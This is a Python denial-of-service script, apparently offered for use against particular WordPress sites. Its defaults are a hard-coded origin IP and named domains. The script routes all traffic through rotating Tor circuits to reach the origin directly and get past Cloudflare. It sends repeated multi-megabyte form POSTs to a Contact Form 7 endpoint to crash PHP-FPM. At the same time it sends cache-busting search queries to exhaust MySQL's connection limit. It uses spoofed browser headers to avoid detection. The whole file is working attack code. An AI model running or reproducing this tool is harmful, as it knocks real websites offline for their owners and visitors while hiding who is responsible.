#!/usr/bin/env python3
"""
Combo Flood — simultaneous PHP-FPM OOM + MySQL connection exhaustion
Hits origin directly (bypasses Cloudflare) via Tor circuit rotation.

Two attack threads run in parallel:
  upload   — large multipart POSTs to CF7 endpoint → PHP-FPM OOM kill
  search   — /?s= search queries       → MySQL max_connections crash

Either crash alone causes downtime; both together cause persistent down
state that requires manual restart of php-fpm + mysql on the origin.

Usage:
  python3 combo_flood.py --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50
  python3 combo_flood.py --origin 104.236.68.226 --host metoo-buffalo.com --form-id 248
  python3 combo_flood.py --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50 \\
                         --upload-workers 15 --search-workers 30 --size 7
"""

import argparse, os, sys, time, threading, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    from curl_cffi import requests as cf_requests
    from curl_cffi import CurlMime
    USE_CFFI = True
except ImportError:
    import requests as cf_requests
    USE_CFFI = False

from proxy_pool import TorPool

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"; M = "\033[0;35m"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

BROWSER_PROFILES = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-GB,en;q=0.8"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "Accept": "application/json, */*", "Accept-Language": "en-US,en;q=0.7"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5"},
]

SEARCH_TERMS = [
    "the","and","for","are","but","not","you","all","can","was",
    "one","our","out","day","get","has","him","his","how","its",
    "may","new","now","old","see","two","who","did","she","use",
    "her","man","big","end","put","why","let","try","say","act",
]


# ── shared stats ──────────────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock  = threading.Lock()
        self.upload = {"ok": 0, "err": 0, "times": []}
        self.search = {"ok": 0, "err": 0, "times": []}

    def record(self, lane, ok, elapsed):
        with self._lock:
            d = self.upload if lane == "upload" else self.search
            if ok:
                d["ok"] += 1
            else:
                d["err"] += 1
            d["times"].append(elapsed)

    def snapshot(self):
        with self._lock:
            import copy
            return copy.deepcopy(self.upload), copy.deepcopy(self.search)


# ── random payload ────────────────────────────────────────────────────────────

def random_text(size_bytes):
    chunk = ''.join(random.choices(string.ascii_lowercase + ' \n', k=4096))
    full, rem = divmod(size_bytes, 4096)
    return chunk * full + chunk[:rem]


# ── upload worker ─────────────────────────────────────────────────────────────

def _worker_held(code, err):
    """
    Any outcome except hard ECONNREFUSED = server received our request.
    Timeout / empty reply / reset = worker was pinned on server side = goal.
    """
    if code and code > 0:
        return True
    if err:
        e = err.lower()
        if any(x in e for x in ("connection refused", "no route to host",
                                 "name or service not known", "nodename nor")):
            return False
        return True  # timeout, reset, empty reply, socks relay, etc = held
    return False


def upload_worker(origin, port, host, form_id, size_mb, pool, stats, stop_evt):
    url = f"http://{origin}:{port}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"
    payload = random_text(int(size_mb * 1024 * 1024))

    while not stop_evt.is_set():
        proxy   = pool.next()
        headers = random.choice(BROWSER_PROFILES).copy()
        headers["Host"] = host
        t0 = time.time()
        err_str = None
        code    = 0
        try:
            if USE_CFFI:
                mime = CurlMime()
                mime.addpart(name="your-name",    data="Test User")
                mime.addpart(name="your-email",   data="test@example.com")
                mime.addpart(name="your-subject", data="test")
                mime.addpart(name="your-message", data=payload)
                r = cf_requests.post(url, multipart=mime, headers=headers,
                                     proxies={"http": proxy, "https": proxy},
                                     timeout=90, impersonate="chrome124", verify=False)
                code = r.status_code
            else:
                r = cf_requests.post(url,
                                     data={"your-name": "Test User",
                                           "your-email": "test@example.com",
                                           "your-subject": "test",
                                           "your-message": payload},
                                     headers=headers,
                                     proxies={"http": proxy, "https": proxy},
                                     timeout=90)
                code = r.status_code
        except Exception as e:
            err_str = str(e)
        stats.record("upload", _worker_held(code, err_str), time.time() - t0)


# ── search worker ─────────────────────────────────────────────────────────────

def search_worker(origin, port, host, pool, stats, stop_evt):
    while not stop_evt.is_set():
        proxy   = pool.next()
        headers = random.choice(BROWSER_PROFILES).copy()
        headers["Host"] = host
        term  = random.choice(SEARCH_TERMS)
        bust  = random.randint(1, 999999)
        url   = f"http://{origin}:{port}/?s={term}{bust}"
        t0 = time.time()
        err_str = None
        code    = 0
        try:
            if USE_CFFI:
                r = cf_requests.get(url, headers=headers,
                                    proxies={"http": proxy, "https": proxy},
                                    timeout=45, impersonate="chrome124", verify=False)
                code = r.status_code
            else:
                r = cf_requests.get(url, headers=headers,
                                    proxies={"http": proxy, "https": proxy},
                                    timeout=45)
                code = r.status_code
        except Exception as e:
            err_str = str(e)
        stats.record("search", _worker_held(code, err_str), time.time() - t0)


# ── status printer ────────────────────────────────────────────────────────────

def status_loop(stats, stop_evt, upload_w, search_w, size_mb):
    start = time.time()
    prev_u = {"ok": 0, "err": 0}
    prev_s = {"ok": 0, "err": 0}

    while not stop_evt.is_set():
        time.sleep(5)
        u, s = stats.snapshot()
        runtime = time.time() - start

        u_rate = (u["ok"] + u["err"] - prev_u["ok"] - prev_u["err"]) / 5
        s_rate = (s["ok"] + s["err"] - prev_s["ok"] - prev_s["err"]) / 5
        prev_u = {"ok": u["ok"], "err": u["err"]}
        prev_s = {"ok": s["ok"], "err": s["err"]}

        u_avg = sum(u["times"][-50:]) / len(u["times"][-50:]) if u["times"] else 0
        s_avg = sum(s["times"][-50:]) / len(s["times"][-50:]) if s["times"] else 0

        u_total = u["ok"] + u["err"]
        s_total = s["ok"] + s["err"]

        u_ok_pct = u["ok"] / u_total * 100 if u_total else 0
        s_ok_pct = s["ok"] / s_total * 100 if s_total else 0

        if u_total == 0:      u_st = Y + "WAITING..." + W
        elif u_ok_pct >= 60:  u_st = G + "HOLDING" + W
        elif u_ok_pct >= 20:  u_st = Y + "PARTIAL" + W
        else:                 u_st = R + "BLOCKED/REFUSED" + W

        if s_total == 0:      s_st = Y + "WAITING..." + W
        elif s_ok_pct >= 60:  s_st = G + "HOLDING" + W
        elif s_ok_pct >= 20:  s_st = Y + "PARTIAL" + W
        else:                 s_st = R + "BLOCKED/REFUSED" + W

        ts = datetime.now().strftime("%H:%M:%S")
        print(
            f"  {ts} | Runtime={runtime:.0f}s\n"
            f"    {M}[UPLOAD ×{upload_w}]{W} reqs={u_total} ok={u_ok_pct:.0f}% "
            f"avg={u_avg:.1f}s rate={u_rate:.1f}/s status={u_st}\n"
            f"    {C}[SEARCH ×{search_w}]{W} reqs={s_total} ok={s_ok_pct:.0f}% "
            f"avg={s_avg:.1f}s rate={s_rate:.1f}/s status={s_st}\n"
        )


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="Combo Flood — PHP-FPM OOM + MySQL exhaustion via Tor",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("--origin",         default="104.236.68.226",
                   help="Origin IP (default: 104.236.68.226)")
    p.add_argument("--port",           type=int, default=80,
                   help="Origin port (default: 80)")
    p.add_argument("--host",           default="metoo-shatkin.com",
                   help="Host header (default: metoo-shatkin.com)")
    p.add_argument("--form-id",        type=int, default=50,
                   help="CF7 form ID (default: 50)")
    p.add_argument("--size",           type=float, default=7.0,
                   help="Upload payload MB per request (default: 7.0)")
    p.add_argument("--upload-workers", type=int, default=15,
                   help="Concurrent upload threads (default: 15)")
    p.add_argument("--search-workers", type=int, default=30,
                   help="Concurrent search threads (default: 30)")
    args = p.parse_args()

    print(f"""
{B}{'='*66}{W}
  Combo Flood — PHP-FPM OOM + MySQL exhaustion
{B}{'='*66}{W}
  Origin        : {args.origin}:{args.port}
  Host header   : {args.host}
  CF7 form ID   : {args.form_id}
  Upload workers: {args.upload_workers} × {args.size}MB payload  (→ PHP-FPM OOM)
  Search workers: {args.search_workers} × /?s= queries      (→ MySQL crash)
  Total workers : {args.upload_workers + args.search_workers}
  Proxy         : Tor SOCKS5 127.0.0.1:9050 (circuit rotate per request)
  Mode          : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    pool = TorPool()
    stats = Stats()
    stop_evt = threading.Event()

    threads = []

    for _ in range(args.upload_workers):
        t = threading.Thread(
            target=upload_worker,
            args=(args.origin, args.port, args.host, args.form_id,
                  args.size, pool, stats, stop_evt),
            daemon=True,
        )
        t.start()
        threads.append(t)

    for _ in range(args.search_workers):
        t = threading.Thread(
            target=search_worker,
            args=(args.origin, args.port, args.host, pool, stats, stop_evt),
            daemon=True,
        )
        t.start()
        threads.append(t)

    status_t = threading.Thread(
        target=status_loop,
        args=(stats, stop_evt, args.upload_workers, args.search_workers, args.size),
        daemon=True,
    )
    status_t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop_evt.set()

    u, s = stats.snapshot()
    runtime_end = time.time()
    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT")
    print(f"{B}{'='*66}{W}")
    u_total = u["ok"] + u["err"]
    s_total = s["ok"] + s["err"]
    print(f"  Upload reqs : {u_total}  |  ok={u['ok']}  err={u['err']}")
    print(f"  Search reqs : {s_total}  |  ok={s['ok']}  err={s['err']}")
    if u["times"]:
        print(f"  Upload avg  : {sum(u['times'])/len(u['times']):.2f}s")
    if s["times"]:
        print(f"  Search avg  : {sum(s['times'])/len(s['times']):.2f}s")
    mb_sent = args.size * u_total
    print(f"  Data sent   : {mb_sent/1024:.2f} GB")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
